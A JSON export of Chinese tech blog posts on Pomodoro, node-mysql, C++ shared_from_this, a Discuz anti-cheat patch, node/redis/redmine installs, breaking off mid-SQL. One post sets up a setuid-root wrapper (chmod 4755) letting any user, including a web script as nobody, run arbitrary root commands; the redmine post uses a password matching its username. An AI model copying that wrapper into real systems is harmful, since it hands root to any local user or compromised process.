  "body": "\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">基本要领</h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<p>\n从事务清单中选出今天要做的事\n</p>\n\n<p>\n按优先级填入今日工作计划表\n</p>\n\n<p>\n从表中选择第一项未完成事务按下计时器\n</p>\n\n<p>\n专心做这件事\n</p>\n\n<p>\n25钟后铃响立即停止做事\n</p>\n\n<p>\n在当前事务后标记用掉了一个番茄\n</p>\n\n<p>\n事务完成则在今日事务清单划掉当前任务\n</p>\n\n<p>\n专心休息地5分钟（每4个周期长休息15-30分钟）\n</p>\n\n<p>\n按下计时器\n</p>\n\n<p>\n继续做事\n</p>\n\n<p>\n如此往复\n</p>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">掌控干扰因素</h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<ul class=\"org-ul\">\n<li>做事时如遇实发事件酌情处理：\n\n<ul class=\"org-ul\">\n<li>添加到事务清单中明天再处理\n</li>\n<li>直接安排到今日事务清单稍后处理\n</li>\n<li>立即取消当前事务开始处理突发事件\n</li>\n</ul>\n</li>\n\n<li>在当前事务后方打个中断标记\n</li>\n</ul>\n</div>\n</div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">解读工作记录</h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<p>\n一天结束后我们将获得以下信息：\n</p>\n\n<ul class=\"org-ul\">\n<li>知道处理某个事务用时多少。怎样让时间用得更少？\n</li>\n\n<li>知道时间花在哪里去了。能否将时间更多花在有效处理工作上？\n</li>\n</ul>\n\n<p>\n当新的一天开始时，我们会清楚地知道每天有多少个番茄可用，今天可以安排多少事务，每个事务需要消耗多少个番茄。\n</p>\n\n<p>\n随着我们不断地根据这些记录改进我们的工作效率，最终我们能够安排时间、掌控时间。\n</p>\n</div>\n</div>\n\n<div id=\"outline-container-sec-4\" class=\"outline-2\">\n<h2 id=\"sec-4\">番茄工作法遵从习惯法则</h2>\n<div class=\"outline-text-2\" id=\"text-4\">\n<p>\n当我跟老婆解释番茄工作法时，她说了句：“这个和你之前说的习惯法则很像”，细细一想不无道理。\n</p>\n\n<p>\n习惯的形成的三个步骤：暗示、惯常行为、奖赏。以及习惯回路。\n</p>\n\n<p>\n番茄工作法也有这三个要素：\n</p>\n\n<p>\n　　暗示　　　　　　按下计时器\n</p>\n\n<p>\n　　惯常行为　　　　处理事务\n</p>\n\n<p>\n　　奖赏　　　　　　清脆的铃响、标记番茄的成就感、休息时间的放松\n</p>\n\n<p>\n而习惯回路的形成也容易发现，每天一早来到公司，谁不渴望今天能够过得充满成就感、休息时能够毫无顾忌呢。\n</p>\n\n<p>\n遵从习惯法则的方法论才会更容易展开并长久地坚持下去。\n</p>\n</div>\n</div>\n\n<div id=\"outline-container-sec-5\" class=\"outline-2\">\n<h2 id=\"sec-5\">参考资料</h2>\n<div class=\"outline-text-2\" id=\"text-5\">\n<p>\n<a href=\"http://www.pomodorotechnique.com/download/pdf/ThePomodoroTechnique-CHN_v1-3.pdf\">《番茄工作法》</a>\n<a href=\"http://baike.baidu.com/view/5259318.htm\">番茄工作法_百度百科</a>\n<a href=\"http://pomodoro.kankanan.com\">番茄工作法在线服务</a></p>\n</div>\n</div>\n"
},
{
  "title": "node.js下访问mysql注意事项",
  "timestamp": "2013-10-11 10:45:00",
  "tags": [
    "node",
    "mysql"
  ],
  "body": "<p>\n本文仅针对 <a href=\"https://github.com/felixge/node-mysql\">node-mysql</a> 模块。\n</p>\n\n<ul class=\"org-ul\">\n<li>Connection 对象为一个到mysql的连接，在其上的query是串行进行的。\n\n<p>\n由于mysql协议类似http是串行的，在一个mysql连接上的多个query必须依次进行。\n</p>\n\n<p>\n<a href=\"https://github.com/felixge/node-mysql\">node-mysql</a> 的 Connection对象上同时发起的多个query会队列化，\n</p>\n\n<p>\n处理完一个query再进行下一query的处理，传递给回调函数的query结果不会错乱。\n</p>\n\n<p>\n在有一定访问量的服务中应该总是使用 <code>连接池</code> 。\n</p>\n</li>\n</ul>\n\n\n<ul class=\"org-ul\">\n<li>处理Connection对象的重连。\n\n<p>\nmysql连接空闲一段时间后（默认8小时）会自动关闭，\n</p>\n\n<p>\n可以在Connection对象的 <code>error</code> 事件中检测后连接断开时进行重连。\n</p>\n\n<p>\n使用 <code>连接池</code> 不会有问题，连接断开后会默认从连接池中剔除。</p>\n</li>\n</ul>\n"
},
{
  "title": "为什么不能在构造函数中调用shared_from_this",
  "timestamp": "2013-12-20 01:02:00",
  "tags": [
    "cpp"
  ],
  "body": "<p>\n先看示例代码：\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-c++\"><span style=\"color: #99cc99;\">class</span> <span style=\"color: #6699cc;\">Chicken</span> : <span style=\"color: #99cc99;\">public</span> <span style=\"color: #6699cc;\">enable_shared_from_this</span>&lt;<span style=\"color: #6699cc;\">Chicken</span>&gt;\n{\n<span style=\"color: #99cc99;\">public</span>:\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #f99157;\">Chicken</span>()\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #6699cc;\">shared_ptr</span>&lt;<span style=\"color: #6699cc;\">Chicken</span>&gt; <span style=\"color: #ffcc66;\">chicken_ptr</span> = shared_from_this();    <span style=\"color: #999999; font-style: italic;\">//</span><span style=\"color: #999999; font-style: italic;\">throw std::ba</span><span style=\"color: #999999; font-style: italic; text-decoration: underline;\">d_weak_ptr</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n};\n</pre>\n</div>\n\n<p>\n再看shared_from_this()的行为：\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-c++\"><span style=\"color: #99cc99;\">return</span> _weak_ptr-&gt;lock();\n</pre>\n</div>\n\n<p>\n<code>_weak_ptr</code> 为父类（ <code>enable_shared_from_this</code> &lt;Chicken&gt;）的成员变量，需要一个 <code>shared_ptr</code> &lt;Chicken&gt;对象来初始化它，而 <code>shared_ptr</code> &lt;Chicken&gt;需要一个Chicken对象来创建，但此时Chicken对象正在构造中，这是个鸡与蛋的无解问题。\n</p>\n\n<p>\n其实 <code>_weak_ptr</code> 成员变量是在 <code>shared_ptr</code> 的构造函数中延迟初始化的，不只是在构造函数中不能调用 <code>shared_from_this</code> ，像下面的使用方式同样不行：\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-c++\"><span style=\"color: #6699cc;\">Chicken</span>* <span style=\"color: #ffcc66;\">chicken</span> = <span style=\"color: #99cc99;\">new</span> <span style=\"color: #6699cc;\">Chicken</span>();\n<span style=\"color: #6699cc;\">shared_ptr</span>&lt;<span style=\"color: #6699cc;\">Chicken</span>&gt; <span style=\"color: #ffcc66;\">chicken_ptr</span> = chicken-&gt;shared_from_this();  <span style=\"color: #999999; font-style: italic;\">//</span><span style=\"color: #999999; font-style: italic;\">throw std::bad</span><span style=\"color: #999999; font-style: italic; text-decoration: underline;\">_weak_ptr</span>\n</pre>\n</div>\n\n<p>\n<code>enable_shared_from_this</code> 不是从this祼指针变出智能指针的魔法，它只是一个辅助类，为一个只使用 <code>shared_ptr</code> 管理对象生命周期的类添加一个自身的智能指针成员变量供内部使用。\n</p>\n\n<p>\n而“不能在构造函数中调用 <code>shared_from_this</code> ”这个问题仅仅是标准实现上的一个漏洞。\n</p>\n\n<p>\n你应该像下面这样用：\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-c++\"><span style=\"color: #99cc99;\">class</span> <span style=\"color: #6699cc;\">Chicken</span> : <span style=\"color: #99cc99;\">public</span> <span style=\"color: #6699cc;\">enable_shared_from_this</span>&lt;<span style=\"color: #6699cc;\">Chicken</span>&gt;\n{\n<span style=\"color: #99cc99;\">public</span>:\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #f99157;\">Chicken</span>()\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #6699cc;\">void</span> <span style=\"color: #f99157;\">use</span>()\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #6699cc;\">shared_ptr</span>&lt;<span style=\"color: #6699cc;\">Chicken</span>&gt; <span style=\"color: #ffcc66;\">chicken_ptr</span> = shared_from_this();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n};\n\n<span style=\"color: #6699cc;\">shared_ptr</span>&lt;<span style=\"color: #6699cc;\">Chicken</span>&gt; <span style=\"color: #ffcc66;\">chicken_ptr</span>(<span style=\"color: #99cc99;\">new</span> <span style=\"color: #6699cc;\">Chicken</span>);\nchicken_ptr-&gt;use();\n</pre>\n</div>\n\n<p>\n突然想起一段对话：\n</p>\n<blockquote>\n<p>\n阿漆：闻西，事情进行的怎么样了，闻西？\n</p>\n\n<p>\n达闻西： 最近我发明了些东西，相信能帮得到你。\n</p>\n\n<p>\n达闻西拿出手电筒。\n</p>\n\n<p>\n阿漆：手电筒？\n</p>\n\n<p>\n达闻西：错，这支不是一只普通的手电筒，这支是一支不需要电池的太阳能手电筒，在有光的时候他就会亮。\n</p>\n\n<p>\n司令：那如果没有光呢？\n</p>\n\n<p>\n达闻西：绝对不亮。\n</p>\n\n<p>\n阿漆：有没有可能没光的时候它也会亮？\n</p>\n\n<p>\n达闻西：问的好，关灯。\n</p>\n\n<p>\n达闻西：你拿另一只手电筒照它呢，它就会亮。\n</p>\n\n<p>\n达闻西：哈哈，怎么样啊？\n</p>\n\n<p>\n阿漆：这个发明还真有创意啊。\n</p>\n</blockquote>\n\n\n\n<p>\n参考：《<a href=\"http://hi.baidu.com/cpuramdisk/item/7c2f8d77385e0f29d7a89cf0\">shared_from_this 几个值得注意的地方</a>》</p>\n"
},
{
  "title": "Discuz访问推广任务反作弊",
  "timestamp": "2013-12-20 01:02:00",
  "tags": [
    "php",
    "discuz"
  ],
  "body": "<ul class=\"org-ul\">\n<li>识别作弊\n\n<p>\n发贴、回复较少的用户具有偏高的积分、等级通常就是潜在的作弊对象。在后台查看该用户的积分历史，如果来历不明，那么很可能是通过访问推广作弊获得的。\n</p>\n\n<p>\n在我们的例子里就发现有一个用户金钱数过高，先查看该用户的积分表：\n</p>\n\n<pre class=\"example\">\nmysql&gt; SELECT total, cyclenum, extcredits2 FROM g_common_credit_rule_log WHERE rid=8 and uid=119;\n+-------+----------+-------------+\n| total | cyclenum | extcredits2 |\n+-------+----------+-------------+\n|  3454 |     3454 |           1 |\n+-------+----------+-------------+\n1 row in set (0.00 sec)\n</pre>\n\n<p>\n相关字段说明\n</p>\n<dl class=\"org-dl\">\n<dt> total </dt><dd>策略被执行总次数\n</dd>\n<dt> cyclenum </dt><dd>周期被执行次数 \n</dd>\n<dt> extcredits2 </dt><dd>我们的系统里对应金钱数\n</dd>\n<dt> rid </dt><dd>值8为访问推广任务类型\n</dd>\n<dt> uid </dt><dd>值119为作弊用户id\n</dd>\n</dl>\n<p>\n从上面可以看出该用户完成了3454次任务， 接下来就需要确认这些任务是通过作弊完成的了。\n</p>\n\n<p>\n搜索该用户推广链接在web服务器中留下的访问日志：\n</p>\n<pre class=\"example\">\nlogs# grep 'fromuid=119' /usr/local/nginx/logs/access.log*\n\"GET /?fromuid=119.jpg HTTP/1.1\" 301 6243 \"http://xxxx.org/details.php?id=178668\"\n...\n</pre>\n\n<p>\n可以初步断定，该用户通过在其它论坛中发布信息并将推广url注入到图片的url中，这样我们的站点在访问量没有任何增长的情况下该用户的推广数却瞬间彪升了。\n</p>\n</li>\n\n<li>阻止作弊\n\n<p>\n通过使用引用页中的用户标识进行记录来解决这个问题，这样只有当用户来到论坛并进行了相关操作才算推荐有效。\n</p>\n\n<p>\n修改source/class/discuz/discuz_application.php文件，将下面的内容：\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-php\"><span style=\"color: #99cc99;\">if</span>((<span style=\"color: #6699cc;\">!</span><span style=\"color: #99cc99;\">empty</span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">_GET</span>[<span style=\"color: #66cccc;\">'fromuid'</span>]) || <span style=\"color: #6699cc;\">!</span><span style=\"color: #99cc99;\">empty</span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">_GET</span>[<span style=\"color: #66cccc;\">'fromuser'</span>])) &amp;&amp; (<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #6699cc;\">this</span>-&gt;<span style=\"color: #ffcc66;\">var</span>[<span style=\"color: #66cccc;\">'setti</span><span style=\"color: #66cccc; text-decoration: underline;\">ng'</span><span style=\"text-decoration: underline;\">][</span><span style=\"color: #66cccc; text-decoration: underline;\">'creditspolicy'</span><span style=\"text-decoration: underline;\">][</span><span style=\"color: #66cccc; text-decoration: underline;\">'promotion_visit'</span><span style=\"text-decoration: underline;\">] || </span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">$</span><span style=\"color: #6699cc; text-decoration: underline;\">this</span><span style=\"text-decoration: underline;\">-&gt;</span><span style=\"color: #ffcc66; text-decoration: underline;\">var</span><span style=\"text-decoration: underline;\">[</span><span style=\"color: #66cccc; text-decoration: underline;\">'setting'</span><span style=\"text-decoration: underline;\">][</span><span style=\"color: #66cccc; text-decoration: underline;\">'creditspolicy'</span><span style=\"text-decoration: underline;\">][</span><span style=\"color: #66cccc; text-decoration: underline;\">'promotion_register'</span><span style=\"text-decoration: underline;\">])) {</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">require_once</span> libfile(<span style=\"color: #66cccc;\">'misc/promotion'</span>, <span style=\"color: #66cccc;\">'include'</span>);\n}\n</pre>\n</div>\n<p>\n改为：\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-php\"><span style=\"color: #99cc99;\">if</span> (<span style=\"color: #99cc99;\">isset</span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">_SERVER</span>[<span style=\"color: #66cccc;\">'HTTP_REFERER'</span>]) &amp;&amp; strpos(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">_SERVER</span>[<span style=\"color: #66cccc;\">'HTTP_REFERER'</span>], <span style=\"color: #66cccc;\">'http://</span><span style=\"color: #66cccc; text-decoration: underline;\">XXX.com/'</span><span style=\"text-decoration: underline;\">) === 0) {</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">referer_query</span> = parse_url(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">_SERVER</span>[<span style=\"color: #66cccc;\">'HTTP_REFERER'</span>], <span style=\"color: #6699cc;\">PHP_URL_QUERY</span>);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span> (<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">referer_query</span>) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   parse_str(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">referer_query</span>, <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">referer_get</span>);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span>((<span style=\"color: #6699cc;\">!</span><span style=\"color: #99cc99;\">empty</span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">referer_get</span>[<span style=\"color: #66cccc;\">'fromuid'</span>]) || <span style=\"color: #6699cc;\">!</span><span style=\"color: #99cc99;\">empty</span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">referer_get</span>[<span style=\"color: #66cccc;\">'fromuser'</span>]))<span style=\"text-decoration: underline;\"> &amp;&amp; (</span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">$</span><span style=\"color: #6699cc; text-decoration: underline;\">this</span><span style=\"text-decoration: underline;\">-&gt;</span><span style=\"color: #ffcc66; text-decoration: underline;\">var</span><span style=\"text-decoration: underline;\">[</span><span style=\"color: #66cccc; text-decoration: underline;\">'setting'</span><span style=\"text-decoration: underline;\">][</span><span style=\"color: #66cccc; text-decoration: underline;\">'creditspolicy'</span><span style=\"text-decoration: underline;\">][</span><span style=\"color: #66cccc; text-decoration: underline;\">'promotion_visit'</span><span style=\"text-decoration: underline;\">] || </span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">$</span><span style=\"color: #6699cc; text-decoration: underline;\">this</span><span style=\"text-decoration: underline;\">-&gt;</span><span style=\"color: #ffcc66; text-decoration: underline;\">var</span><span style=\"text-decoration: underline;\">[</span><span style=\"color: #66cccc; text-decoration: underline;\">'setting'</span><span style=\"text-decoration: underline;\">][</span><span style=\"color: #66cccc; text-decoration: underline;\">'creditspolicy'</span><span style=\"text-decoration: underline;\">][</span><span style=\"color: #66cccc; text-decoration: underline;\">'promotion_register'</span><span style=\"text-decoration: underline;\">])) {</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">require_once</span> libfile(<span style=\"color: #66cccc;\">'misc/promotion'</span>, <span style=\"color: #66cccc;\">'include'</span>);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n}\n</pre>\n</div>\n\n<p>\n修改source/include/misc/misc_promotion.php文件，将下面的内容：\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-php\"><span style=\"color: #99cc99;\">if</span>(<span style=\"color: #6699cc;\">!</span><span style=\"color: #99cc99;\">empty</span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">_GET</span>[<span style=\"color: #66cccc;\">'fromuid'</span>])) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">fromuid</span> = intval(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">_GET</span>[<span style=\"color: #66cccc;\">'fromuid'</span>]);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">fromuser</span> = <span style=\"color: #66cccc;\">''</span>;\n} <span style=\"color: #99cc99;\">else</span> {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">fromuser</span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">_GET</span>[<span style=\"color: #66cccc;\">'fromuser'</span>];\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">fromuid</span> = <span style=\"color: #66cccc;\">''</span>;\n}\n</pre>\n</div>\n<p>\n改为：\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-php\"><span style=\"color: #99cc99;\">if</span>(<span style=\"color: #6699cc;\">!</span><span style=\"color: #99cc99;\">empty</span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">referer_get</span>[<span style=\"color: #66cccc;\">'fromuid'</span>])) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">fromuid</span> = intval(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">referer_get</span>[<span style=\"color: #66cccc;\">'fromuid'</span>]);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">fromuser</span> = <span style=\"color: #66cccc;\">''</span>;\n} <span style=\"color: #99cc99;\">else</span> {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">fromuser</span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">referer_get</span>[<span style=\"color: #66cccc;\">'fromuser'</span>];\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">fromuid</span> = <span style=\"color: #66cccc;\">''</span>;\n}\n</pre>\n</div>\n</li>\n</ul>\n"
},
{
  "title": "linux下允许普通用户执行需要root权限的命令",
  "timestamp": "2013-12-26 15:44:00",
  "tags": [
    "linux",
    "c"
  ],
  "body": "<p>\n最典型的情况是要实现一个通过web界面重启系统的功能，通常为了安全会以非root用户身份（通常是nobody）运行服务端脚本，这样脚本中就不能执行危险操作了。\n</p>\n\n<p>\n下面的c工具程序可以允许任意用户执行需要root权限的命令：\n</p>\n\n<p>\n<a href=\"../static/as_root.c\">as_root.c</a>\n</p>\n\n<p>\n编译：\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">gcc -g as_root.c -o as_root\n</pre>\n</div>\n\n<p>\n配置：\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">chown root:root ./as_root; chmod 4755 ./as_root\n</pre>\n</div>\n\n<p>\n运行：\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo -u <span style=\"color: #66cccc;\">\"nobody\"</span> ./as_root <span style=\"color: #66cccc;\">\"reboot\"</span>\n</pre>\n</div>\n\n<p>\n参考：<a href=\"http://blog.tianya.cn/blogger/post_show.asp?BlogID=126326&PostID=1629441\">如何在普通用户下执行一些需要root用户执行的命令</a></p>\n"
},
{
  "title": "express.js中如何在第一次请求的响应中取得connect.sid",
  "timestamp": "2014-02-14 23:34:00",
  "tags": [
    "node"
  ],
  "body": "<p>\n在web页面通过iframe跨域登录访问服务的情况下，是不方便取cookie中的sessionid的，于是想到将sessionid直接放到响应体中，\n这就需要在node.js中直接获取connect.sid这个cookie值，一开始想当然地以为系统（使用的是passport.js）会在登录认证通过后\n执行res.cookie('connect.sid', &#x2026;)进行设置，就想直接从res的Set-Cookie头解析出设置的值，结果发现这个cookie压根不存在，\n甚至在库代码中搜索cookie都不管用，着实急得人直抓头。最后dump出res后确在req中见到了connect.sid值的影子：req.sessionID，\n然后在 <a href=\"http://stackoverflow.com/questions/13693101/express-sessionid-differs-from-sessionid-in-cookie\">《Express SessionID differs from SessionID in Cookie》</a> 中找到了从req.sessionID计算出connect.sid的方法：\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\"><span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">signature</span> = require(<span style=\"color: #66cccc;\">'express/node_modules/cookie-signature'</span>);\n<span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">connectSid</span> = <span style=\"color: #66cccc;\">'s:'</span> + signature.sign(req.sessionID, sessionOptions.secret);\n</pre>\n</div>\n\n<p>\n其实，connect.sid这个cookie是在请求到来后在req上设置的（不存在则设置），不管有没有登录都会设置。</p>\n"
},
{
  "title": "编译安装node.js",
  "timestamp": "2014-02-17 16:23:00",
  "tags": [
    "node"
  ],
  "body": "<ul class=\"org-ul\">\n<li>下载\n\n<p>\nnode.js是一个新兴的开发平台，版本更新非常活跃，因此应该尽量下载安装最新的版本。\n</p>\n\n<p>\n到 <a href=\"http://nodejs.org/\">http://nodejs.org/</a> 下载最新的版本。\n</p>\n</li>\n\n<li>安装\n\n<p>\n解压后参照 README.md 进行安装：\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">./configure\nmake\nmake install\n</pre>\n</div>\n</li>\n\n<li>安装后\n\n<p>\n默认安装到/usr/local。\n</p>\n\n<dl class=\"org-dl\">\n<dt> /usr/local/bin/node </dt><dd>node主程序\n</dd>\n<dt> /usr/local/bin/npm </dt><dd>node模块管理程序\n</dd>\n<dt> /usr/local/lib/node_modules </dt><dd>node全局模块目录\n</dd>\n</dl>\n<p>\n像一些需要全局安装的模块也会把文件安装在/usr/local目录下。\n</p>\n</li>\n</ul>\n"
},
{
  "title": "编译安装redis",
  "timestamp": "2014-02-17 16:40:00",
  "tags": [
    "redis"
  ],
  "body": "<ul class=\"org-ul\">\n<li>下载\n\n<p>\n到 <a href=\"http://redis.io/download\">http://redis.io/download</a> 下载最新稳定版本。\n</p>\n</li>\n\n<li>安装\n\n<p>\n解压后参照 README 进行安装：\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">make\nmake install\n</pre>\n</div>\n\n<p>\n默认安装到/usr/local。\n</p>\n\n<p>\n指定位置安装： \n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">make <span style=\"color: #ffcc66;\">PREFIX</span>=/usr/local/redis install\n</pre>\n</div>\n</li>\n\n<li>安装后\n\n<dl class=\"org-dl\">\n<dt> /usr/local/bin/redis-cli </dt><dd>redis客户端程序 \n</dd>\n<dt> /usr/local/bin/redis-server </dt><dd>redis服务器程序\n</dd>\n</dl>\n</li>\n\n<li>配置\n\n<p>\n将源码包附带的配置文件 <code>redis.conf</code> 拷贝到安装位置:\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">mkdir /usr/local/redis/etc/\ncp ./redis.conf /usr/local/redis/etc/\n</pre>\n</div>\n\n<p>\n修改配置文件 <code>redis.conf</code> :\n</p>\n\n<pre class=\"example\">\ndaemonize yes\npidfile /usr/local/redis/var/redis.pid\nlogfile /usr/local/redis/var/redis.log\ndir /usr/local/redis/data\nstop-writes-on-bgsave-error no\nbind 127.0.0.1\n</pre>\n</li>\n\n<li>启动\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">/usr/local/redis/bin/redis-server /usr/local/redis/etc/redis.conf\n</pre>\n</div>\n</li>\n\n<li>停止\n\n<p>\n使用redis客户端中执行shutdown命令\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">redis-cli\nshutdown\n</pre>\n</div>\n</li>\n</ul>\n"
},
{
  "title": "CentOS 6.4下安装redmine",
  "timestamp": "2014-03-07 14:17:00",
  "tags": [
    "linux",
    "redmine"
  ],
  "body": "<p>\n本文为CentOS 6.4下安装redmine-2.5.0的笔记，按照 <a href=\"http://www.redmine.org/projects/redmine/wiki/RedmineInstall\">官方文档</a> 进行安装。\n</p>\n\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">安装 <code>ruby</code></h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">yum install ruby\nyum install ruby-devel\nyum install rubygems\n</pre>\n</div>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">安装 <code>redmine</code></h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">wget <span style=\"color: #66cccc;\">'http://www.redmine.org/releases/redmine-2.5.0.tar.gz'</span>\ntar xzvf redmine-2.5.0.tar.gz\ngem install bundler\ngem install mysql2.\nyum install ImageMagick ImageMagick-devel\nbundle install --without development test\n</pre>\n</div>\n</div>\n</div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">配置 <code>redmine</code></h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<ul class=\"org-ul\">\n<li>以 root 用户登录 <code>mysql</code>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">mysql -uroot -p\n</pre>\n</div>\n</li>\n\n<li>创建 <code>redmine</code> 用户及库\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sql\"><span style=\"color: #99cc99;\">CREATE</span> DATABASE redmine <span style=\"color: #6699cc;\">CHARACTER</span> <span style=\"color: #99cc99;\">SET</span> utf8;\n<span style=\"color: #99cc99;\">CREATE</span> <span style=\"color: #cc99cc;\">USER</span> <span style=\"color: #66cccc;\">'redmine'</span>@<span style=\"color: #66cccc;\">'localhost'</span> IDENTIFIED <span style=\"color: #99cc99;\">BY</span> <span style=\"color: #66cccc;\">'redmine'</span>;\n<span style=\"color: #99cc99;\">GRANT</span> <span style=\"color: #99cc99;\">ALL</span> <span style=\"color: #99cc99;\">PRIVILEGES</span> <span style=\"color: #99cc99;\">ON</span> redmine.* <span style=\"color: #99cc99;\">TO</span> <span style=\"color: #66cccc;\">'redmine'</span>@<span style=\"color: 